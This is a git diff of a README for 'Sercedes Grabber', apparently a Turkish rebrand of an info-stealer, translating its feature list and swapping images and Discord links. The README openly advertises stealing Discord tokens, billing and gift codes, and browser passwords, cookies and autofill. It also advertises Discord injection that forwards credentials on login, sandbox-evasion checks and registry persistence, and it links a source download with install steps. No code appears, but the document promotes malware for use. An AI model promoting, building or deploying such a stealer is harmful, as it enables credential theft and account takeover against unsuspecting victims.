@@ -1,33 +1,33 @@
 ## SERCEDES GRABBER [ TR ]
 
-<img src="https://cdn.discordapp.com/attachments/1062070879418318929/1062071822138491033/SERCEDES_LOGO1.png"> 
+<img src="https://cdn.discordapp.com/attachments/1062070879418318929/1062094174691803256/sercedes_ust.png"> 
 
-## Features
-- Discord token İnfo
+## Özellikler
+- Discord token Bilgisi
     - Nitro
-    - Badges 
-    - Billing
-    - Email
-    - Phone
+    - Discord Rozetleri 
+    - Discord Faturalandırma Bilgisi
+    - E-Posta Bilgisi
+    - Telefon Bilgisi
     - HQ Guilds
-    - HQ Friends
-    - Gift codes
-- Browser data
+    - HQ Arkadaş
+    - Hediye Kodları
+- Tarayıcı Bilgileri
     - Cookies
-    - Passwords
-    - History
-    - Bookmarks
-    - Autofill
-    - Chrome, Edge, Brave, Opera GX, and many more...
+    - Şifreler
+    - Geçmiş
+    - Yer İmleçleri
+    - Otomatik Doldurma
+    - Chrome, Edge, Brave, Opera GX, ve daha fazlası...
 - Discord injection
     - Girişte veya şifre değiştirildiğinde token, şifre ve e-posta gönderir.
-- System info
-    - User
-    - System
+- Sistem Bilgisi
+    - Kullanıcı
+    - Sistem
     - Disk
-    - Network
+    - Ağ
     - WiFi
-    - Screenshot
+    - Ekran Fotoğrafı
 - Anti-debug
     - Virustotal sanal alanında çalıştırılıp çalıştırılmadığını kontrol eder
 
@@ -35,10 +35,10 @@
     - Grabber ve Stub'ı appdata'ya yerleştirin
     - Başlangıç kayıt defterine ekle
 
-## Install
+## Nasıl İndirilir?
 <br>
 <details>
-    <summary>ÖnKoşullars</summary>
+    <summary>ÖnKoşullar</summary>
     <ul>
         <li><a href="https://www.python.org/downloads/windows/"><p>Python</p></a></li>
         <li><a href="https://git-scm.com/download/win"><p>Git</p></a></li>
@@ -46,7 +46,7 @@
 </details>
 <br>
 <details>
-    <summary>Aptallar İçin</summary>
+    <summary>Anlamayanlar İçin</summary>
     <ol>
         <li><a href="https://github.com/addi00000/empyrean/archive/refs/heads/main.zip">Download source code zip</a></li>
         <li>Extract zip</li>
@@ -66,31 +66,16 @@ cd Sercedes
 
 
 
-<div align="center">
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/bu0.png"></img>
-    <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="75%">    
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em0.png"></img>
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em1.png"></img>
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em2.png"></img>
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em3.png"></img>
-</div>
-
-
-
-## Contributing
-
-View the [contributing guidelines](CONTRIBUTING.md) for more information on how you can help out.
-
 
 
 ## License
 
-Empyrean is licensed under the <a href="https://mit-license.org/">MIT License</a>.
+Sercedes <a href="https://mit-license.org/">MIT License</a> Altına Lisanslanmıştır.
 
 
 
-## Errors?
-- Make an [issue](https://github.com/Sercedes001/Sercedes-Grabber/issues)
-- Join the [Discord](https://discord.gg/vdwxZNr9H7)
+## Hata Mı Alıyorsunuz?
+- Konu Açabilirsiniz  [issue](https://github.com/Sercedes001/Sercedes-Grabber/issues)
+- Discordumuza Katılabilirsiniz [Discord](https://discord.gg/PRMc4WuQSM)
 
-<img src="img/footer.png">
+<img src="https://cdn.discordapp.com/attachments/1062070879418318929/1062094187081773108/sercedes_alt.png">
